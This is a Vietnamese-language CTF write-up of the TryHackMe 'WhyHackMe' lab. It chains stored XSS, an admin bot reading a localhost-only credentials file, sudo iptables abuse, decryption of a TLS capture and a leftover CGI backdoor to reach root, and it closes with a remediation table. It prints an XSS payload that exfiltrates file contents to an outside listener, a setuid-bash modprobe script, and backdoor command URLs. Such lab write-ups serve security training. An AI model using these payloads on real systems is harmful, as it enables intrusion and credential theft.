# WhyHackMe

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | [https://tryhackme.com/room/whyhackme](https://tryhackme.com/room/whyhackme) |
| **Độ khó** | Hard |
| **Chủ đề** | Web, Stored XSS, Blind SSRF (qua admin bot), Privilege Escalation, TLS Traffic Decryption, CGI Backdoor |
| **Ngày** | 01/07/2026 |

---

## Mô tả

Một website cá nhân (blog + hệ thống đăng ký/đăng nhập) chạy PHP trên Apache. Chuỗi khai thác gồm 3 giai đoạn nối tiếp:

1. Stored XSS qua trường `username` không được escape → kết hợp với "admin bot" tự động ghé thăm blog từ `127.0.0.1` để đọc trộm 1 file chỉ cho phép truy cập từ localhost, lấy được creds SSH.
2. Từ SSH, lạm dụng quyền `sudo iptables` được cấp cho user để mở lại 1 cổng đã bị admin tự tay chặn.
3. Đằng sau cổng đó là dấu vết một backdoor CGI mà kẻ tấn công trước để lại — giải mã lại phiên TLS cũ (do server dùng cipher suite không có forward secrecy) để tìm ra cách gọi backdoor, và backdoor đó cho `sudo` không cần mật khẩu → root.

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -sC --open -p- --min-rate 3000 -Pn 10.48.178.73
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 21/tcp | FTP | vsftpd 3.0.3 (cho phép anonymous login) |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache/2.4.41 (Ubuntu) |

### Liệt kê FTP

Anonymous login được phép, thư mục gốc chỉ có 1 file:

```bash
curl -s ftp://anonymous:anonymous@10.48.178.73/update.txt
```

```
Hey I just removed the old user mike because that account was compromised and
for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt
and don't worry this file is only accessible by localhost(127.0.0.1), so
nobody else can view it except me or people with access to the common account.
- admin
```

Thử truy cập trực tiếp file được nhắc tới:

```bash
curl -i http://10.48.178.73/dir/pass.txt
# HTTP/1.1 403 Forbidden
```

Xác nhận Apache có `Require ip 127.0.0.1` cho thư mục `/dir/` — file chỉ đọc được nếu request xuất phát từ chính máy đó.

### Liệt kê Web

`gobuster`/`ffuf` với wordlist tự tạo tìm ra:

| Endpoint | Chức năng |
|----------|-----------|
| `/index.php` | Trang giới thiệu |
| `/blog.php` | Blog + phần bình luận (public, không cần login để xem) |
| `/login.php`, `/register.php` | Đăng nhập / đăng ký tài khoản |
| `/dir/` | 403 — chỉ localhost |

Blog có sẵn 1 comment từ `admin`: *"Hey people, I will be monitoring your comments so please be safe and civil."* — gợi ý có cơ chế tự động theo dõi bình luận.

---

## Khai thác

### Bước 1 — Stored XSS qua trường username

Đăng ký tài khoản với `username` chứa HTML, đăng nhập, và đăng 1 comment:

```bash
curl -c cookies.txt -X POST http://10.48.178.73/register.php \
  --data-urlencode "username=<img src=x onerror=alert(1)>" \
  --data-urlencode "password=Test123!"
```

Kết quả trên `/blog.php`:

```html
<h2>Name: <img src=x onerror=alert(1)><br>Comment: hello from xss test</h2>
```

Trường `comment` được `htmlspecialchars()` (test `<script>` bị encode thành `&lt;script&gt;`), nhưng trường **`username` hoàn toàn không được escape** khi hiển thị lại trong danh sách "All comments" — stored XSS không cần đăng nhập để xem (blog hiển thị công khai).

### Bước 2 — Xác nhận có "admin bot" chạy trên localhost

Dựng 1 listener HTTP riêng và đăng ký tài khoản với payload beacon đơn giản:

```html
<script>new Image().src='http://<listener>:8000/beacon?u='+encodeURIComponent(document.URL)</script>
```

Sau khoảng 1 phút, listener nhận được:

```
GET /beacon?u=http%3A%2F%2F127.0.0.1%2Fblog.php HTTP/1.1
```

Xác nhận: có một bot (headless browser) ghé thăm `/blog.php` mỗi ~60 giây, và quan trọng nhất — nó tải trang qua **`http://127.0.0.1/blog.php`** chứ không phải qua IP public. Nghĩa là script XSS chạy trong ngữ cảnh origin `http://127.0.0.1`, nên `fetch()`/`XMLHttpRequest` tới `http://127.0.0.1/dir/pass.txt` là **same-origin** — không bị CORS chặn, và request xuất phát từ chính localhost nên vượt qua luôn giới hạn `Require ip 127.0.0.1` của Apache.

### Bước 3 — Đọc file localhost-only và exfiltrate

Thử với `fetch().then().then()` bất đồng bộ trước — không nhận được gì. Nguyên nhân: bot có thời gian "ở lại" trang rất ngắn, đóng tab trước khi chuỗi `.then()` kịp hoàn thành (race condition). Giải pháp: dùng `XMLHttpRequest` đồng bộ (`async=false`) để chặn luồng JS cho tới khi đọc xong file, đảm bảo hoàn tất trước khi bot có thể đóng trang:

```html
<script>
try{
  var x=new XMLHttpRequest();
  x.open('GET','http://127.0.0.1/dir/pass.txt',false);
  x.send();
  new Image().src='http://<listener>:8000/exfil?d='+encodeURIComponent(x.responseText);
}catch(e){
  new Image().src='http://<listener>:8000/err?e='+encodeURIComponent(e.message);
}
</script>
```

Đăng ký username này, đăng comment, đợi chu kỳ bot tiếp theo:

```
GET /exfil?d=jack%3AWhyIsMyPasswordSoStrongIDK%0A HTTP/1.1
```

URL-decode: **`jack:WhyIsMyPasswordSoStrongIDK`**.

### Bước 4 — SSH với creds vừa lấy

```bash
ssh jack@10.48.178.73
cat ~/user.txt
```

→ **User Flag**.

---

## Leo thang đặc quyền

### Bước 1 — sudo -l

```bash
sudo -l
```

```
User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

Thử kỹ thuật GTFOBins kinh điển cho iptables (`--modprobe` trỏ tới script độc hại, lợi dụng lúc iptables cần load kernel module `ip_tables`):

```bash
echo '#!/bin/sh' > /tmp/priv.sh
echo 'chmod u+s /bin/bash' >> /tmp/priv.sh
chmod +x /tmp/priv.sh
sudo iptables -L -v -n --modprobe=/tmp/priv.sh
```

**Không hiệu quả** — module `ip_tables` đã được load sẵn từ trước (box có iptables rules đang chạy), nên iptables không bao giờ gọi tới `--modprobe` nữa.

### Bước 2 — Cổng ẩn bị chặn bởi chính admin

```bash
ss -tlnp
sudo iptables -L INPUT -v -n --line-numbers
```

```
1  DROP    tcp  --  *  *  0.0.0.0/0  0.0.0.0/0  tcp dpt:41312
...
8  DROP    all  --  *  *  0.0.0.0/0  0.0.0.0/0
```

Cổng `41312` đang listen nhưng bị 1 luật DROP riêng biệt chặn — rất bất thường. Dùng chính quyền `sudo iptables` để gỡ luật chặn và mở lại cổng (nhớ thêm ACCEPT rõ ràng trước rule DROP-all cuối cùng):

```bash
sudo iptables -D INPUT 1
sudo iptables -I INPUT 6 -p tcp --dport 41312 -j ACCEPT
```

```bash
curl -k https://10.48.178.73:41312/
# 403 Forbidden — Apache/2.4.41 (Ubuntu) Server at 10.48.178.73 Port 41312
```

Đây là 1 vhost HTTPS riêng, phục vụ `/usr/lib/cgi-bin` (kiểm tra `/etc/apache2/sites-enabled/000-default.conf`), quyền thư mục `0750 root:h4ck3d` — jack không đọc/list được.

### Bước 3 — Manh mối từ /opt

```bash
cat /opt/urgent.txt
```

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and
when I try to remove them, they wont, even though I am root. Please go through
the pcap file in /opt and help me fix the server. And I temporarily blocked
the attackers access to the backdoor by using iptables rules. The cleanup of
the server is still incomplete I need to start by deleting these files first.
```

→ Xác nhận: có một backdoor bị cài trong `cgi-bin`, admin không xoá được (kể cả với quyền root), và **chính admin đã dùng iptables để tạm khoá cổng 41312** — luật mà chúng ta vừa gỡ bỏ ở bước 2.

`/opt/capture.pcap` (27KB) là bản ghi lại phiên tấn công gốc.

### Bước 4 — Giải mã pcap bằng private key TLS tĩnh

Vhost cổng 41312 cấu hình:

```apache
SSLCipherSuite AES256-SHA
SSLProtocol -all +TLSv1.2
```

`AES256-SHA` (`TLS_RSA_WITH_AES_256_CBC_SHA`) là cipher suite trao đổi khoá **RSA tĩnh, không có forward secrecy** — nếu có private key của server, toàn bộ traffic đã ghi lại trước đó đều giải mã lại được offline. Key world-readable trên máy:

```bash
cat /etc/apache2/certs/apache.key   # -----BEGIN PRIVATE KEY-----
```

Tải `capture.pcap` và `apache.key` về máy tấn công, giải mã bằng `tshark`:

```bash
tshark -r capture.pcap \
  -o 'uat:rsa_keys:"apache.key",""' \
  -Y http -T fields -e http.request.full_uri -e http.file_data
```

Kết quả lộ ra toàn bộ request/response đã mã hoá trước đó:

```
GET https://10.0.2.15:41312/cgi-bin/5UP3r53Cr37.py
GET https://10.0.2.15:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
→ uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
GET .../5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al
```

### Bước 5 — Backdoor vẫn còn sống

File backdoor không bị xoá được (như `urgent.txt` mô tả) → thử gọi lại y hệt request đã giải mã, trên cổng vừa mở lại:

```bash
curl -sk "https://10.48.178.73:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id"
# uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
```

Backdoor vẫn hoạt động, chạy quyền `www-data` (nằm trong group `h4ck3d` — lý giải vì sao nó đọc/thực thi được file trong `cgi-bin`).

### Bước 6 — www-data có NOPASSWD ALL

```bash
curl -sk "https://10.48.178.73:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20-l"
```

```
User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

```bash
curl -sk "https://10.48.178.73:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20/root/root.txt"
```

→ **Root Flag**.

---

## Cờ

> Giá trị thực không được ghi vào write-up.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| User Flag | `/home/jack/user.txt` | Stored XSS (username) → blind SSRF qua admin bot đọc `127.0.0.1/dir/pass.txt` → creds SSH |
| Root Flag | `/root/root.txt` | Sudo iptables mở lại cổng ẩn → giải mã pcap bằng private key TLS → gọi lại backdoor CGI cũ → `sudo` NOPASSWD |

---

## Bài học

| Lỗ hổng | Gốc rễ | Cách fix |
|---------|--------|----------|
| Stored XSS qua username | `htmlspecialchars()` chỉ áp dụng cho comment, quên áp dụng cho username khi hiển thị | Escape mọi input do người dùng kiểm soát tại nơi output, không riêng lẻ theo field |
| Blind SSRF qua XSS + admin bot | Bot review chạy trên chính server, tải trang qua `127.0.0.1` → mọi XSS tự động có quyền same-origin với localhost | Chạy bot review trong môi trường cô lập, không có quyền mạng tới các service nội bộ |
| Giới hạn IP bằng `Require ip 127.0.0.1` | Chỉ chặn được request từ ngoài, không chặn được request do chính server tự gửi (qua trình duyệt/CGI) | Không dùng vị trí mạng làm cơ chế xác thực duy nhất; cần thêm token/auth thực sự |
| `sudo` cấp toàn quyền `/usr/sbin/iptables` | Cho phép user thường sửa toàn bộ luật tường lửa, kể cả rule bảo vệ do admin tự đặt | Giới hạn sudo theo rule cụ thể (`iptables -C ...`) hoặc dùng capability thay vì full binary |
| Cipher suite TLS không có forward secrecy (`AES256-SHA`) | Cho phép giải mã lại toàn bộ traffic cũ nếu private key bị lộ sau này | Chỉ dùng cipher suite ECDHE/DHE, vô hiệu hoá RSA key exchange tĩnh |
| Backdoor CGI không dọn dẹp được sau incident | File thuộc group đặc biệt, không được xử lý triệt để trong quá trình khắc phục sự cố | Cô lập/rebuild server sau khi phát hiện xâm nhập thay vì cố gắng "dọn" từng phần |
| `www-data` có `sudo NOPASSWD: ALL` | Cấu hình sudoers quá lỏng lẻo — có thể do backdoor tự thêm hoặc lỗi cấu hình sẵn có | Không bao giờ cấp `ALL:ALL NOPASSWD` cho user chạy dịch vụ web |
